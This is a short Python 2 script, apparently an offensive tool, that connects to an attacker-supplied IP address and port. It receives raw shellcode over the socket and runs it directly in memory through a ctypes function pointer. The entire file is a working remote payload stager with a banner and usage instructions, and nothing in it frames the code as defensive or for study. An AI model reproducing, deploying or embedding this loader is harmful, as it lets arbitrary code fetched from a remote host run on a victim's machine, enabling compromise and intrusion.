__author__ = '01'
__author__ += "Binary"
__author__ += "ZeroOne"
__author__ += "Hooman"

import socket
import sys
import ctypes

def ExecShellCode(ShellCode) :

    print "[+] Create Buffer In Memory Size : " + str(len(ShellCode)) + " Byte"
    # Create Buffer In Memory                       #Value          #Size
    ShellCode_Buffer = ctypes.create_string_buffer(ShellCode, len(ShellCode))

    print "[+] Create A Function Pointer To ShellCode"
    # Create A Function Pointer To ShellCode
                        #Cast           #Value                              # void *
    ShellCode_Func   = ctypes.cast(ShellCode_Buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

    print "[+] Executed"

    # Call ShellCode
    ShellCode_Func()

def Main(Data) :

    try :

        print "[+] Create Socket"
        Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        print "[*] Connecting ..."
        Socket.connect((str(Data[0]), int(Data[1])))
        print "[*] Wait For Receive ..."
        ShellCode = Socket.recv(10240)

        ExecShellCode(ShellCode)

    except :

        print "[+] Error"

if __name__ == "__main__" :

    print "[+] Welcome"

    Banner = '''
      000      0
     0   0    01
    1 0   1  0 1
    1  0  1    1
    1   0 1    1
     0   0     1
      000    10001
        =======================================================
     00000
    1     1  100001   0000   1    0  00000      1     00000   0   0
    1        1       1    1  1    0  1    1     1       1      0 0
     00000   00000   0       1    0  1    1     1       1       0
          1  1       0       0    1  00000      0       1       1
    1     1  1       1    1  0    1  1   0      0       1       1
     00000   100001   0000   100001  1    0     0       1       1
    '''

    print Banner

    if(len(sys.argv) != 2 or len(sys.argv[1].split(':')) != 2):

        print "[-] Usage : " + sys.argv[0] + " <IPAddress:Port>"
        print "[.] Example : " + sys.argv[0] + " 192.168.1.50:1024"

        exit(0)

    Arg = sys.argv[1]

    IPAddress = Arg.split(":")[0]

    Port = Arg.split(":")[1]

    Data = (IPAddress, Port)

    Main(Data)
